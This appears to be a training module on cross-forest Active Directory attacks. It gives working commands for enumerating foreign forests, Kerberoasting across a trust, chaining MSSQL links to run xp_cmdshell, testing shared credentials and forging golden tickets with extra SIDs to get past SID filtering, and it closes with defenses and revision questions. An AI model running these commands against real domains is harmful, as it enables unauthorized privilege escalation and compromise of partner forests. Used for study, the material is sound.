# Cross-Forest Attacks

## Unit 8 - Topic 5 | Domain Dominance

---

## Overview

**Cross-forest attacks** target Active Directory environments with multiple forests connected by trust relationships. While forest trusts have SID filtering enabled by default (making attacks harder than intra-forest), multiple techniques exist to exploit cross-forest access and compromise resources in the trusted forest.

---

## 1. Cross-Forest Attack Surface

```
CROSS-FOREST ATTACK VECTORS:

TRUST-BASED:
├── SID filtering bypass (high-RID groups)
├── Foreign group membership exploitation
├── Shared/mirrored admin accounts
├── Selective authentication bypass
└── Trust key compromise

APPLICATION-BASED:
├── MSSQL linked servers (cross-forest queries)
├── Shared web applications
├── Federation services (ADFS)
├── Shared certificate authorities
└── Shared file servers

CREDENTIAL-BASED:
├── Password reuse across forests
├── Shared service accounts
├── Same local admin passwords
├── Cached credentials from forest users
└── Golden/Silver ticket with trusted SIDs

NETWORK-BASED:
├── Network connectivity between forests
├── Shared network segments
├── VPN tunnels between environments
└── Cloud services spanning forests
```

---

## 2. Reconnaissance Across Forests

```bash
# === ENUMERATE FOREIGN FOREST ===

# Trust information:
Get-DomainTrust
Get-ForestTrust
nltest /domain_trusts /all_trusts

# Foreign domain info:
Get-DomainController -Domain partner.com
Get-Domain -Domain partner.com

# Foreign group members:
Get-DomainForeignGroupMember -Domain partner.com
# Shows: Our users in their groups

Get-DomainForeignUser -Domain partner.com
# Shows: Their users in our groups

# Enumerate partner.com users (if allowed):
Get-DomainUser -Domain partner.com
Get-DomainGroup -Domain partner.com
Get-DomainComputer -Domain partner.com

# BloodHound multi-forest:
# Collect data from both forests:
.\SharpHound.exe -c all -d corp.local
.\SharpHound.exe -c all -d partner.com
# Import both into same BloodHound instance
# Shows cross-forest attack paths!

# === KERBEROAST ACROSS TRUST ===
# If trust allows it, Kerberoast in foreign domain:
GetUserSPNs.py -target-domain partner.com \
  corp.local/user:pass -dc-ip dc01
```

---

## 3. Cross-Forest Exploitation Techniques

```bash
# === 1. FOREIGN GROUP MEMBER ABUSE ===
# If our user is in their admin group:
crackmapexec smb partner-srv01.partner.com \
  -u our_user -p pass
# If (Pwn3d!) → admin access in foreign forest!

# === 2. SHARED ADMIN ACCOUNTS ===
# Common: "firewall_admin", "monitoring_svc"
# Same password in both forests!
# Test known creds against foreign domain:
crackmapexec smb partner-dc01 -u admin -p 'SharedPass!'

# === 3. MSSQL LINK CHAINS ===
# SQL Server links often span forests
# Discover and exploit:
Import-Module PowerUpSQL.ps1

# Find SQL instances:
Get-SQLInstanceDomain | Get-SQLConnectionTest

# Find linked servers:
Get-SQLServerLink -Instance sql01.corp.local

# Crawl link chain:
Get-SQLServerLinkCrawl -Instance sql01.corp.local
# May discover: sql01 → sql02.partner.com → sql03.partner.com
# Execute commands through the chain:
Get-SQLServerLinkCrawl -Instance sql01.corp.local \
  -Query "EXEC master..xp_cmdshell 'whoami'"

# === 4. PAM TRUST EXPLOITATION ===
# Privileged Access Management trust:
# Allows just-in-time admin access from bastion forest
# If bastion forest is compromised → access production forest

# === 5. ADFS TOKEN FORGERY ===
# If ADFS is shared between forests:
# Compromise ADFS signing certificate
# Forge tokens for any application in either forest
# "Golden SAML" attack
```

---

## 4. SID Filtering Bypass Scenarios

```bash
# === HIGH-RID GROUP EXPLOITATION ===
# SID filtering blocks RID < 1000
# Custom groups often have RID ≥ 1000

# Step 1: Find high-privilege custom groups in target forest
Get-DomainGroup -Domain partner.com | \
  ForEach-Object {
    $rid = [int]($_.objectsid -split '-')[-1]
    if ($rid -ge 1000) {
      [PSCustomObject]@{
        Name = $_.name
        SID = $_.objectsid
        RID = $rid
        Description = $_.description
      }
    }
  } | Where-Object {$_.Name -match "admin|backup|operator|dba"}

# Step 2: If found (e.g., "SQL_Full_Admin" RID 1109)
# Forge ticket with this SID:
kerberos::golden /user:fakeuser \
  /domain:corp.local /sid:S-1-5-21-OUR-SID \
  /krbtgt:OUR_KRBTGT \
  /sids:S-1-5-21-PARTNER-SID-1109 \
  /ptt

# Step 3: Access resources that "SQL_Full_Admin" controls
dir \\partner-sql01.partner.com\c$

# === WHEN SID FILTERING IS COMPLETELY OFF ===
# (Misconfiguration — verify with):
netdom trust corp.local /d:partner.com /quarantine
# If "Quarantine is NOT set" → SID filtering OFF!

# Full Extra SID attack possible:
kerberos::golden /user:Administrator \
  /domain:corp.local /sid:S-1-5-21-OUR-SID \
  /krbtgt:OUR_KRBTGT \
  /sids:S-1-5-21-PARTNER-SID-519 \
  /ptt
# Enterprise Admin in partner forest!
```

---

## 5. Defense Against Cross-Forest Attacks

| Defense | Priority |
|---------|:--------:|
| **SID filtering enabled** | 🔴 Critical |
| **Selective authentication** | 🔴 Critical |
| **No shared admin accounts** | 🔴 Critical |
| **SQL link review/restriction** | 🟡 High |
| **Foreign member audit** | 🟡 High |
| **Network segmentation** | 🟡 High |
| **ADFS certificate rotation** | 🟡 High |
| **Trust review** | 🟡 High |
| **Separate credentials** | 🟢 Medium |
| **Cross-forest monitoring** | 🟢 Medium |

```
BEST PRACTICES FOR FOREST ISOLATION:
├── Each forest is a security boundary
│   (but only if properly configured!)
├── Never disable SID filtering
├── Use selective authentication where possible
├── Maintain separate admin accounts per forest
├── Minimize trust relationships
├── Regular cross-forest access review
├── Network segmentation between forests
└── Monitor authentication events across trusts
```

---

## Summary Table

| Attack Vector | Difficulty | SID Filter Blocks? |
|--------------|:----------:|:------------------:|
| **Extra SID (RID < 1000)** | 🟢 Easy | ✅ Yes |
| **High-RID groups** | 🟡 Medium | ❌ No |
| **Foreign members** | 🟢 Easy | N/A |
| **MSSQL links** | 🟡 Medium | N/A |
| **Shared accounts** | 🟢 Easy | N/A |
| **ADFS forgery** | 🔴 Hard | N/A |

---

## Quick Revision Questions

1. **Why is a forest considered a security boundary?**
2. **How can MSSQL link chains enable cross-forest compromise?**
3. **What is the high-RID group SID filtering bypass?**
4. **When would you use selective authentication?**
5. **What is a Golden SAML attack in ADFS environments?**

---

[← Previous: Trust Exploitation](04-trust-exploitation.md)

---

*Unit 8 - Topic 5 of 5 | [Back to README](../README.md) | [Next Unit: AD Hardening →](../09-AD-Hardening/01-tiered-administration-model.md)*
